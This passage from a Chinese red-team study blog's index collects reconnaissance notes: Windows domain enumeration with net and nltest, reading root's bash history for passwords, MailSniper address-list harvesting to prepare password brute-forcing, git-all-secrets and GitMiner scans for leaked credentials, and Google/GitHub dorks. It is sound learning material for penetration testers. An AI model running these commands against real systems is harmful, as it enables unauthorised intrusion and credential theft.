href="#0x01-13-查看本机上的用户账号列表" class="headerlink" title="0x01-13 查看本机上的用户账号列表"></a>0x01-13 查看本机上的用户账号列表</h3><p><code>net user</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/zlCdWYiF.png"></p><h3 id="0x01-14-查看本机用户XXX的信息"><a href="#0x01-14-查看本机用户XXX的信息" class="headerlink" title="0x01-14 查看本机用户XXX的信息"></a>0x01-14 查看本机用户XXX的信息</h3><p><code>net user XXX</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/TmUVLOXU.png"></p><p><code>net user /domain</code>                显示所在域的用户名单</p><p><img src="https://imgtp.apqiang.com/2022/03/28/JLDMZ2vh.png"></p><p><code>net user 域用户 /domain</code>     获取某个域用户的详细信息</p><p><img src="https://imgtp.apqiang.com/2022/03/28/GHUVuVBq.png"></p><p><code>net user /domain XXX 123456</code> 修改域用户密码，需要域管理员权限</p><p><img src="https://imgtp.apqiang.com/2022/03/28/Ac8RtURS.png"></p><p><code>net user /do</code>  获取域用户列表</p><p><img src="https://imgtp.apqiang.com/2022/03/28/m44YMg8S.png"></p><p><code>net group &quot;domain admins&quot; /domain</code>  获取域管理员列表</p><p><code>net group &quot;domain controllers&quot; /domain</code> 查看域控制器（如果有多台）</p><p><code>net group &quot;domain computers&quot; /domain</code> 查看域机器</p><p><code>net group /domain</code> 查询域里面的工作组</p><p><img src="https://imgtp.apqiang.com/2022/03/28/jy2JeBDy.png"></p><p><code>net localgroup administrators</code>  本机管理员[通常含有域用户]</p><p><code>net localgroup administrators /domain</code> 登录本机的域管理员</p><p><code>net localgroup administrators workgroup\user001 /add</code> 域用户添加到本机</p><p><img src="https://imgtp.apqiang.com/2022/03/28/zG8nxbA6.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/28/DcdhGkQM.png"></p><p><code>net view</code> 查看同一域内机器列表</p><p><code>net view \\ip</code> 查看某IP共享</p><p><code>net view \\GHQ</code> 查看GHQ计算机的共享资源列表</p><p><code>net view /domain</code> 查看内网存在多少个域</p><p><code>net view /domain:XYZ</code> 查看XYZ域中的机器列表</p><p><code>net accounts /domain</code> 查询域用户密码过期等信息</p><h2 id="0x02-Windows（域）"><a href="#0x02-Windows（域）" class="headerlink" title="0x02 Windows（域）"></a>0x02 Windows（域）</h2><p><code>nltest /domain_trusts /all_trusts /v /server:192.168.1.2</code> 返回所有域信任列表</p><p><code>nltest /dsgetdc:hack /server:192.168.1.2</code> 返回域控和其相应的IP地址</p><p><img src="https://imgtp.apqiang.com/2022/03/28/1Hm3VtpJ.png"></p><h2 id="0x03-Linux"><a href="#0x03-Linux" class="headerlink" title="0x03 Linux"></a>0x03 Linux</h2><h3 id="0x03-1-查看当前权限"><a href="#0x03-1-查看当前权限" class="headerlink" title="0x03-1 查看当前权限"></a>0x03-1 查看当前权限</h3><p><code>whoami</code></p><h3 id="0x03-2-查看网卡配置"><a href="#0x03-2-查看网卡配置" class="headerlink" title="0x03-2 查看网卡配置"></a>0x03-2 查看网卡配置</h3><p><code>ifconfig</code></p><h3 id="0x03-3-查看端口状态（开启了哪些服务，内网IP连接等）"><a href="#0x03-3-查看端口状态（开启了哪些服务，内网IP连接等）" class="headerlink" title="0x03-3 查看端口状态（开启了哪些服务，内网IP连接等）"></a>0x03-3 查看端口状态（开启了哪些服务，内网IP连接等）</h3><p><code>netstat -anpt</code></p><h3 id="0x03-4-查看进程状态（开启了哪些服务等）"><a href="#0x03-4-查看进程状态（开启了哪些服务等）" class="headerlink" title="0x03-4 查看进程状态（开启了哪些服务等）"></a>0x03-4 查看进程状态（开启了哪些服务等）</h3><p><code>ps -ef</code></p><h3 id="0x03-5-查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"><a href="#0x03-5-查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）" class="headerlink" title="0x03-5 查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"></a>0x03-5 查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）</h3><p><code>history</code></p><p><code>cat /root/.bash_history</code></p><h3 id="0x03-6-查找某个文件（寻找配置文件等）"><a href="#0x03-6-查找某个文件（寻找配置文件等）" class="headerlink" title="0x03-6 查找某个文件（寻找配置文件等）"></a>0x03-6 查找某个文件（寻找配置文件等）</h3><p><code>find / -name *.cfg</code></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mailsniper.ps1获取Outlook所有联系人</title>
      <link href="/2022/03/28/mailsniper-ps1-huo-qu-outlook-suo-you-lian-xi-ren/"/>
      <url>/2022/03/28/mailsniper-ps1-huo-qu-outlook-suo-you-lian-xi-ren/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍如何获取outlook邮箱信息。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-条件"><a href="#0x01-条件" class="headerlink" title="0x01 条件"></a>0x01 条件</h2><p>掌握其中一个用户邮箱的账号密码，并且可以登录outlook</p><p>outlook地址可以是官方的也可以是目标自己搭建的，并无影响</p><h2 id="0x02目的"><a href="#0x02目的" class="headerlink" title="0x02目的"></a>0x02目的</h2><p>获取目标邮箱里的所有联系人，方便后续爆破弱口令等等</p><h2 id="0x03利用"><a href="#0x03利用" class="headerlink" title="0x03利用"></a>0x03利用</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>将尝试Outlook Web Access（OWA）和Exchange Web服务（EWS）的方法。次命令可用于从Exchange收集电子邮件列表：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain \ username -Password Spring2017 -OutFile global-address-list.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper">https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper</a></p><p><a href="https://www.cnblogs.com/backlion/p/6812690.html">https://www.cnblogs.com/backlion/p/6812690.html</a></p><h2 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h2><p><a href="https://github.com/dafthack/mailsniper">https://github.com/dafthack/mailsniper</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-all-secret</title>
      <link href="/2022/03/26/git-all-secret/"/>
      <url>/2022/03/26/git-all-secret/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍工具git-all-secret，用于搜索github仓库。但笔者在测试的时候docker环境中的工具无法解析dns，而且不能挂起docker进入到bash，使用起来较为困难。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Git-all-secret功能描述"><a href="#Git-all-secret功能描述" class="headerlink" title="Git-all-secret功能描述"></a>Git-all-secret功能描述</h2><ul><li>克隆多个某组织的 public/private 有仓库并扫描；</li><li>克隆多个某组织用户的 public/private 仓库扫描；</li><li>克隆一个某组织的 public/private 仓库并扫描；</li><li>克隆一个某用户的 public/private 仓库并扫描；</li><li>克隆一个某用户的 public/secret gist （代码片段管理服务）并扫描；</li><li>克隆一个某组织团队的仓库并扫描；</li><li>克隆和扫描Github企业仓库还有gists；</li></ul><h2 id="扫描过程需要借助的开源工具"><a href="#扫描过程需要借助的开源工具" class="headerlink" title="扫描过程需要借助的开源工具"></a>扫描过程需要借助的开源工具</h2><ul><li>truffleHog - 扫描高熵值字符串和用户提供的正则表达式；</li><li>repo-supervisor扫描在js和json文件中的高熵值字符串；</li></ul><p>所有工具中的输出文件最终会合并为一个输出文件</p><h2 id="新手入门使用"><a href="#新手入门使用" class="headerlink" title="新手入门使用"></a>新手入门使用</h2><h4 id="下载docker"><a href="#下载docker" class="headerlink" title="下载docker"></a>下载docker</h4><p>运行Git-all-secrets最简便的方法是使用Docker</p><p>获取Docker：apt install docker docker-compose</p><h4 id="下载Git-all-secrets"><a href="#下载Git-all-secrets" class="headerlink" title="下载Git-all-secrets"></a>下载Git-all-secrets</h4><p>git clone <a href="https://github.com/anshumanbh/git-all-secrets.git">https://github.com/anshumanbh/git-all-secrets.git</a></p><h4 id="运行git-all-secrets"><a href="#运行git-all-secrets" class="headerlink" title="运行git-all-secrets"></a>运行git-all-secrets</h4><ul><li><p>运行 docker run –rm -it abhartiya/tools_gitallsecrets –help 查看帮助信息</p></li><li><p>运行 docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; 扫描组织</p></li><li><p>运行 docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -toolName=&lt;&gt; 选择待定工具，toolName=thog or repo-supervisor</p></li><li><p>运行 docker run -it abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -toolName=thog -thogEntropy truffleHog 的默认正则和高熵设置</p></li><li><p>当容器完成运行，输入 docker ps -a 返回容器ID</p></li><li><p>获得容器ID以后，输入 docker cp :/root/results.txt 来获取结果文件</p></li></ul><h4 id="标志-选项"><a href="#标志-选项" class="headerlink" title="标志/选项"></a>标志/选项</h4><ul><li>-token= Github访问令牌。如果未授权请求Github API会被限速</li><li>-org= 组织扫描。他会扫描组织中的所有公共仓库，以及用户的gists。如果你使用的是该组织用户的token，他还会克隆并扫描该用户的所有私密gitsts，以及所有该用户有权限访问的私有仓库</li><li>-user= 用户扫描。他会扫描当前用户的所有仓库和gists，扫描私有仓库请使用scanPrivateReposOnly标志，以及SSHkey</li><li>-repoURL= httpsURL 仓库扫描。他只会扫描当前仓库。如果你希望扫描私有仓库，请提供SSH URL和SSHkey，以及scanPrivateReposOnly标志</li><li>-gistURL= httpsURL Gist扫描。他只会扫描Gist。如果你知道私密gist的httpsURL，他也能够访问</li><li>-output= 输出结果文件，默认是result.txt</li><li>-cloneForks= 这是一个布尔标志。默认设置为0，不克隆forks，如果设置为1，他就会克隆forks</li><li>-orgOnly= 这也是一个布尔标志。默认设置为0。如果只扫描组织仓库而不扫描用户的仓库，请将它设置为1</li><li>-toolName= 这是规范扫描工具的标志。默认他使用all，thog和repo-supervisor</li><li>-scanPrivateReposOnly= 这是规范是否扫描用户私有仓库的标志。他只能工作在user、repoURL、org标志</li><li>-enterpriseURL= 企业GithubURL的标志，如果你希望扫描企业仓库，就选这个</li><li>-threads= 默认线程10</li><li>-thogEntropy= 开启高熵提取，默认是false。设置为true会有大量的垃圾信息，在比较大的目标上，不建议开启。如果设置为false，则意味着truffleHog只会提取基于rules.json文件中的正则结果</li><li>-blacklist= 不需要扫描的仓库名称，以逗号分割</li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li><p>Token选项不能为空</p></li><li><p>Org user repoURL gistURL 不能都设置为空，至少需要提供一个选项。如果你提供了多个选项，他的顺序是org&gt;user&gt;repoURL&gt;gistURL。如果你只需要运行在特定用户上，那就不需要提供org选项</p></li><li><p>当定义scanPrivateReposOnly标志时：</p><p>​    1.必须将包含的SSH-key的卷载入到Docker容器中，使用 -v 选项</p><p>​    2.他应该在扫描私有仓库时使用，使用SSH url，而不是https url</p><p>​    3.确保使用了私有仓库/gist的用户token，否则会报错</p><p>​    4.如果你想在没有手动干扰的情况下运行，请不要设置SSH key的密钥密码</p></li><li><p>当定义teamName标志的时候，提供一个团队成 员的token非常重要，否则可能会出现意外结果</p></li><li><p>当定义enterpriseURL标志的时候，即使你提供了http URL，他也始终会考虑ssh key。所有企业克隆/扫描都是通过ssh url，而不是https url</p></li></ul><p>综上，请确保使用了SSH key，并且没有设置密钥密码</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h3 id="扫描私有仓库"><a href="#扫描私有仓库" class="headerlink" title="扫描私有仓库"></a>扫描私有仓库</h3><p>扫描私有仓库最稳妥的方法是使用SSH URL克隆。实现这个你需要将SSH key添加到Github用户。</p><p>用户配置参考：<a href="https://help.github.com/en/articles/adding-a-new-ssh-key-to-your-github-account">https://help.github.com/en/articles/adding-a-new-ssh-key-to-your-github-account</a></p><p>确保这个key没有密码设置。有了SSH key以后，将它挂载到Docker容器中，运行如下命令：</p><p><code>docker run -it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -user=&lt;&gt; -scanPrivateReposOnly</code></p><p>OR</p><p><code>docker run -it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -repoURL=&lt;&gt; -scanPrivateReposOnly</code></p><p>将本地的personal SSH-key存储到Docker内部容器 /root/.ssh/id_rsa，git-all-secrets会试图通过存储在 /root/.ssh/id_rsa 的ssh key来克隆仓库</p><h3 id="扫描组织团队"><a href="#扫描组织团队" class="headerlink" title="扫描组织团队"></a>扫描组织团队</h3><p>Github API限制了私有仓库环境。尝试使用非管理员用户扫描组织，需要给用户添加仓库的访问权限。如果非要扫描组织团队，可以运行：</p><p>docker run –it -v ~/.ssh/id_rsa_personal:/root/.ssh/id_rsa abhartiya/tools_gitallsecrets -token=&lt;&gt; -org=&lt;&gt; -teamName &lt;&gt;</p><h3 id="扫描企业Github"><a href="#扫描企业Github" class="headerlink" title="扫描企业Github"></a>扫描企业Github</h3><p>git-all-secrets支持扫描企业仓库，使用enterpriseURL选项：</p><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -repoURL <a href="https://github/">https://github</a>.<org>.com/<user>/<repo>.git</p><h4 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -repoURL <a href="https://github/">https://github</a>.<org>.com/<user>/<repo>.git -toolName thog -thogEntropy</p><h4 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h4><p>docker run -it -v ~/.ssh/id_rsa_gitenterprise:/root/.ssh/id_rsa -token <token> -enterpriseURL <a href="https://github/">https://github</a>.<org>.com/api/v3 -user <username> -scanPrivateReposOnly</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>可以添加自己的正则表达式，在docker run的时候使用-v $(pwd)/rules.json:/root/truffleHog/rules.json。可以使用默认正则表达式，如果需要，也可以用truffleHog提供的高熵字符串。可以通过repo-supervisor工具搜索.js和.json中的高熵字符串。可以搜索用户的Gist，大多数工具都没这个功能。有新工具可以很容易地集成到git-all-secrets。支持扫描企业Github orgs/uesrs/repos/gists。大多数工具只扫描单个仓库，git-all-secrets可以一次扫描多个。</p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Hacking</title>
      <link href="/2022/03/26/google-hacking/"/>
      <url>/2022/03/26/google-hacking/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍Google中的搜索语法，利用google语法去精准定位一些页面。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><table><thead><tr><th>通配符</th><th>语义</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>+</td><td>包含关键词</td><td>+前面必须要有一个空格</td><td>admin +login</td></tr><tr><td>-</td><td>排除关键词</td><td>-前面必须要有一个空格</td><td>mysql -csdn</td></tr><tr><td>~</td><td>同义词</td><td>~前面必须要有一个空格</td><td>mysql ~csdn</td></tr><tr><td>*</td><td>模糊查询</td><td>*代替任意字符</td><td>mysql**</td></tr><tr><td>“”</td><td>强调</td><td>-</td><td>“mysql”</td></tr></tbody></table><h3 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h3><p>语法：语句:关键词</p><table><thead><tr><th>语法</th><th>语义</th></tr></thead><tbody><tr><td>intitle</td><td>包含标题</td></tr><tr><td>intext</td><td>包含内容</td></tr><tr><td>filetyepe</td><td>文件类型</td></tr><tr><td>info</td><td>基本信息</td></tr><tr><td>site</td><td>指定网站</td></tr><tr><td>inurl</td><td>包含某个url</td></tr><tr><td>link</td><td>包含指定链接的网页</td></tr><tr><td>cache</td><td>显示页面的缓存版本</td></tr><tr><td>numberange</td><td>搜索一个数字</td></tr></tbody></table><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><img src="https://imgtp.apqiang.com/2022/03/26/0ZuyuNYp.png"></p><ul><li>搜索目标包含后台的页面</li></ul><p><code>site:&quot;some-keywords.com&quot; intitle:login intext: 管理|后台|登录|用户名|密码|验证码|系统|账号|manage|admin|login|system</code></p><ul><li>搜索目标是否有列目录</li></ul><p><code>site:&quot;some-keywords.com&quot; intext: index of / | ../ | Parent Directory</code></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Hacking</title>
      <link href="/2022/03/26/github-hacking/"/>
      <url>/2022/03/26/github-hacking/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍Github中的搜索语法，查询项目公开的源码。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Github-Hacking"><a href="#Github-Hacking" class="headerlink" title="Github Hacking"></a>Github Hacking</h2><p>您可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有GitHub存储库：</p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ul><li>Repositories</li><li>Topics</li><li>Issues and pull requests</li><li>Code</li><li>Commits</li><li>Users</li><li>Wikis</li></ul><p>参考：</p><ul><li>Searching for repositories</li><li>Searching topics</li><li>Searching code</li><li>Searching commits</li><li>Searching issues and pull requests</li><li>Searching users</li><li>Searching wikis</li><li>Searching in forks</li></ul><p>您可以使用 <em>搜索</em> 页面或 <em>高级搜索</em> 页面搜索GitHub。</p><p>您可以使用 &gt; , &gt;= , &lt; , 和 &lt;= 搜索是大于，大于或等于，小于和小于或等于另一个值的值。</p><h3 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a>搜索仓库</h3><table><thead><tr><th>Query</th><th>Example</th></tr></thead><tbody><tr><td>&gt;_n_</td><td>cats stars:&gt;1000 匹配关键字”cats”且star大于1000的仓库</td></tr><tr><td>&gt;=_n_</td><td>cats topics:&gt;=5 匹配关键字”cats”且标签数量大于等于5的仓库</td></tr><tr><td>&lt;_n_</td><td>cats size:&lt;10000 匹配关键字”cats”且文件小于10KB的仓库</td></tr><tr><td>&lt;=_n_</td><td>cats stars:&lt;=50 匹配关键字”cats”且star小于等于50的仓库</td></tr><tr><td>_n_..*</td><td>cats stars:10..* 匹配关键字”cats”且star大于10的仓库</td></tr><tr><td>*.._n_</td><td>cats stars:*..10 匹配关键字”cats”且star小于等于10的仓库</td></tr><tr><td>n..n</td><td>cats stars:10..50 匹配关键字”cats”且star大于10且小于50的仓库</td></tr><tr><td>_n_..*</td><td>cats stars:10..* 匹配关键字”cats”且star大于等于10的仓库</td></tr><tr><td>*.._n_</td><td>cats stars:*..10 匹配关键字”cats”且star小于等于10的仓库</td></tr><tr><td>n..n</td><td>cats stars:10..50 匹配关键字”cats”且star大于10且小于50的仓库</td></tr></tbody></table><h3 id="搜索代码"><a href="#搜索代码" class="headerlink" title="搜索代码"></a>搜索代码</h3><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>只能搜索小于384 KB的文件</li><li>只能搜索小于500,000个文件的存储库</li><li>登录的用户可以搜索所有公共存储库</li><li>除 filename 搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索 language:javascript 无效，而是这样： amazing language:javascript。</li><li>搜索结果最多可以显示来自同一个文件的两个片段，但文件中可能会有更多结果。</li><li>您不能将以下通配符用作搜索查询的一部分：. , : ; / \ ‘ “ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } [ ]。搜索将忽略这些符号。</li></ul><h4 id="日期条件"><a href="#日期条件" class="headerlink" title="日期条件"></a>日期条件</h4><p>cats pushed:&lt;2012-07-05 搜索在2012年07月05日前push代码，且cats作为关键字</p><p>cats pushed:2016-04-30..2016-07-04 日期区间</p><p>cats created:&gt;=2017-04-01 创建时间</p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>AND、OR、NOT</p><h4 id="排除运算"><a href="#排除运算" class="headerlink" title="排除运算"></a>排除运算</h4><p>cats pushed:&lt;2012-07-05 -language:java 搜索在2012年07月05日前push代码，且cats作为关键字，排除 java 语言仓库。</p><h4 id="包含搜索"><a href="#包含搜索" class="headerlink" title="包含搜索"></a>包含搜索</h4><p>cats in:file 搜索文件中包含cats的代码</p><p>cats in:path 搜索路径中包含cats的代码</p><p>cats in:path,file 搜索路劲、文件中包含cats的代码</p><p>console path:app/public language:javascript 搜索关键字console，且语言为javascript，在app/public下的代码</p><h4 id="主题搜索"><a href="#主题搜索" class="headerlink" title="主题搜索"></a>主题搜索</h4><p>user:USERNAME 用户名搜索</p><p>org:ORGNAME 组织搜索</p><p>repo:USERNAME/REPOSITORY 指定仓库搜索</p><h4 id="文件大小"><a href="#文件大小" class="headerlink" title="文件大小"></a>文件大小</h4><p>size:&gt;1000 搜索大小大于1KB的文件</p><h4 id="文件名称"><a href="#文件名称" class="headerlink" title="文件名称"></a>文件名称</h4><p>filename:config.php language:php 搜索文件名为config.php，且语言为php的代码。例如搜索Java项目配置文件：mail filename:.properties</p><p><img src="https://img1.imgtp.com/2022/03/26/Du5ZaVml.png"></p><h4 id="扩展名"><a href="#扩展名" class="headerlink" title="扩展名"></a>扩展名</h4><p>extension:EXTENSION 指定扩展名搜索</p><p>例如：extension:properties jdbc</p><h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 gitminer-v2.0.py -c cookie.txt  -q &#39;extension:properties jdbc&#39; -r &#39;password(.*)&#39; -m passwords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要将cookie信息存入文件中</p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开放漏洞情报&amp;开源情报信息收集（OSINT）</title>
      <link href="/2022/03/25/kai-yuan-lou-dong-qing-bao/"/>
      <url>/2022/03/25/kai-yuan-lou-dong-qing-bao/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍常见的漏洞信息收集和常见的情报信息收集。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="开发漏洞情报"><a href="#开发漏洞情报" class="headerlink" title="开发漏洞情报"></a>开发漏洞情报</h2><h3 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h3><ul><li>CVE <a href="https://cve.mitre.org/">https://cve.mitre.org</a></li><li>Exploit-DB <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li>CX Security <a href="https://cxsecurity.com/">https://cxsecurity.com/</a></li><li>CNVD <a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li><li>securitytracker （网站现已关闭）</li></ul><h3 id="Search-Exploit-DB"><a href="#Search-Exploit-DB" class="headerlink" title="Search Exploit-DB"></a>Search Exploit-DB</h3><p><img src="https://img1.imgtp.com/2022/03/25/dJp5wuQ4.png"></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>搜索Windows提权漏洞</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">searchsploit -t windows <span class="token builtin class-name">local</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/03/25/Sd0TTUUZ.png"></p><p>搜索Apache漏洞</p><p><img src="https://img1.imgtp.com/2022/03/25/Gu6eUnjF.png"></p><h2 id="开源情报信息搜集（OSINT）"><a href="#开源情报信息搜集（OSINT）" class="headerlink" title="开源情报信息搜集（OSINT）"></a>开源情报信息搜集（OSINT）</h2><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><ul><li>百度 <a href="http://www.baidu.com/">http://www.baidu.com</a></li><li>谷歌 <a href="http://www.google.com/">http://www.google.com</a></li><li>必应 <a href="http://www.bing.com/">http://www.bing.com</a></li></ul><h3 id="在线接口"><a href="#在线接口" class="headerlink" title="在线接口"></a>在线接口</h3><table><thead><tr><th>url</th><th>简介</th></tr></thead><tbody><tr><td><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></td><td>主要解析域名ip，同时提供该同服ip站点列表，但多数解析为cdn</td></tr><tr><td><a href="https://search.censys.io/">https://search.censys.io/</a></td><td>根据ip查询开启的服务信息，查看子域关系图。也可以根据body信息查询含有关键字的主机</td></tr><tr><td><a href="https://crt.sh/">https://crt.sh/</a></td><td>可以查询域的OU信息和证书信息</td></tr><tr><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td><td>加载较慢，可以查询解析的ip和开启的服务以及服务器的地域</td></tr><tr><td><a href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a></td><td>关系图、whois信息、dns历史解析、开启的服务、子域以及对应的IP</td></tr><tr><td><a href="https://dnslytics.com/">https://dnslytics.com</a></td><td>根据域名可以查询顶级域不同的域名，可查询路由信息和信息提供者。根据ip查询可以较全的whois信息和开启的服务</td></tr><tr><td><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a></td><td>可以扫描子域名，但是每天只有一次免费的机会，该网站的在线工具都是付费使用</td></tr><tr><td><a href="https://viewdns.info/">https://viewdns.info</a></td><td>有挺多功能，反查ip、whois查询、ip历史、端口扫描等，但是加载慢</td></tr><tr><td><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></td><td>需要注册、邀请码</td></tr><tr><td><a href="https://www.aizhan.com/">https://www.aizhan.com/</a></td><td>可以查询访问量、子域等</td></tr><tr><td><a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></td><td>爆破子域名</td></tr></tbody></table><h3 id="相关整合工具"><a href="#相关整合工具" class="headerlink" title="相关整合工具"></a>相关整合工具</h3><p><a href="https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md">https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md</a></p><p>在线恶意软件分析整合</p><h3 id="DNS历史解析记录"><a href="#DNS历史解析记录" class="headerlink" title="DNS历史解析记录"></a>DNS历史解析记录</h3><p><a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p><p><a href="https://viewdns.info/">https://viewdns.info/</a></p><h3 id="信息收集在线工具合集"><a href="#信息收集在线工具合集" class="headerlink" title="信息收集在线工具合集"></a>信息收集在线工具合集</h3><p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关联信息生成</title>
      <link href="/2022/03/25/guan-lian-xin-xi-sheng-cheng/"/>
      <url>/2022/03/25/guan-lian-xin-xi-sheng-cheng/</url>
      
